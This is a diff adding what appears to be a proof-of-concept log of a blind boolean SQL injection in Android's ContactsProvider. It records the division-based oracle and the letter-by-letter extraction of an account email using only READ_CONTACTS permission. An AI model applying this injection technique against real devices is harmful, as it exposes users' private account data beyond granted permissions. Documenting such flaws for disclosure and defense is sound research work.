@@ -1,0 +1,42 @@
+=== ContactsProvider SQL Injection — Account Email Extraction ===
+Date: Tue Sep  8 01:14:51 IST 2026
+Device: Pixel 6a (26131JEGR04733), Android 17 (API 37)
+
+Method: Blind boolean SQL injection in ContactsProvider selection parameter
+Oracle: Division-based (1/(CASE WHEN condition THEN 1 ELSE 0 END))
+Permission: READ_CONTACTS only
+
+=== Extraction Log ===
+=== ContactsProvider accounts table: email extraction ===
+pos=1: 's'  => s
+pos=2: 'a'  => sa
+pos=3: 'n'  => san
+pos=4: 'd'  => sand
+pos=5: 'i'  => sandi
+pos=6: 'y'  => sandiy
+pos=7: 'o'  => sandiyo
+pos=8: 't'  => sandiyot
+pos=9: 'e'  => sandiyote
+pos=10: 's'  => sandiyotes
+pos=11: 't'  => sandiyotest
+pos=12: '@'  => sandiyotest@
+pos=13: 'g'  => sandiyotest@g
+pos=14: 'm'  => sandiyotest@gm
+pos=15: 'a'  => sandiyotest@gma
+pos=16: 'i'  => sandiyotest@gmai
+pos=17: 'l'  => sandiyotest@gmail
+pos=18: '.'  => sandiyotest@gmail.
+pos=19: 'c'  => sandiyotest@gmail.c
+pos=20: 'o'  => sandiyotest@gmail.co
+pos=21: 'm'  => sandiyotest@gmail.com
+pos=22: END OF STRING
+
+EXTRACTED: sandiyotest@gmail.com
+
+[exited with code 0]
+
+=== Metadata ===
+Accounts in contacts DB: 2
+Account type: com.google (first char 'c')
+Tables confirmed via blind boolean: _sync_state, accounts, phone_lookup (30-35 total)
+EXTRACTED EMAIL: sandiyotest@gmail.com
